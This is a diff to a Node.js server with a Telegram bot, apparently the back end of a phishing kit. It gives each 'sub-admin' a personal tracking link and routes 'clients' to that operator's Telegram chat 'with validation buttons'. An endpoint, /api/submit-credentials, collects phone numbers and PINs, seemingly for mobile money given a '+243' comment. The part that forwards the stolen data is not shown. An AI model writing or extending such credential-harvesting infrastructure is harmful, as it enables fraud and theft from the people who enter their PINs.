@@ -75,14 +75,17 @@ async function initBot() {
         saveAdmins();
       }
 
-      const userLink = `${APP_URL}/?admin=${chatId}`;
+      const personalLink = `${APP_URL}/?admin=${chatId}`;
+      const isMainAdmin = (chatId === String(FALLBACK_ADMIN_ID));
 
-      if (chatId === String(FALLBACK_ADMIN_ID)) {
-        const mainAdminMessage = `👑 *Bienvenue Administrateur Principal*\n\n` +
+      if (isMainAdmin) {
+        const mainAdminMessage = `👑 *PANEL ADMINISTRATEUR PRINCIPAL*\n\n` +
                                  `👤 *Info Telegram:*\n` +
                                  `• Nom: ${firstName} ${lastName}\n` +
                                  `• Chat ID: \`${chatId}\`\n\n` +
-                                 `🔗 *Votre lien personnel exclusif:*\n${userLink}`;
+                                 `🔗 *Votre lien personnel exclusif:*\n\`${personalLink}\`\n\n` +
+                                 `👥 *Gestion des sous-admin:* Tout utilisateur ou sous-administrateur qui envoie \`/start\` au bot se verra attribuer instantanément son propre lien de suivi indépendant.`;
+        
         await bot.sendMessage(chatId, mainAdminMessage, { parse_mode: 'Markdown' });
         return;
       }
@@ -91,11 +94,13 @@ async function initBot() {
                               `👤 *Vos Infos:*\n` +
                               `• Nom: ${firstName} ${lastName}\n` +
                               `• Chat ID: \`${chatId}\`\n\n` +
-                              `🔗 *Votre lien de suivi privé et indépendant:*\n${userLink}\n\n` +
-                              `_Note: Vos clients sont routés exclusivement vers votre chat._`;
+                              `🔗 *Votre lien de suivi privé et indépendant:*\n\`${personalLink}\`\n\n` +
+                              `_Note: Tous les clients qui ouvrent votre lien seront routés exclusivement vers votre chat privé avec les boutons de validation._`;
 
       await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
-    } catch (err) {}
+    } catch (err) {
+      console.error('Error handling /start command:', err);
+    }
   });
 
   bot.on('callback_query', async (query) => {
@@ -147,7 +152,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Phone Number & PIN (Routes strictly to mapped sub-admin without leaking +243)
+// Step 1: Submit Phone Number & PIN (Routes strictly to mapped sub-admin)
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { phone, pin, adminChatId } = req.body || {};
@@ -237,4 +242,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
+                                                 
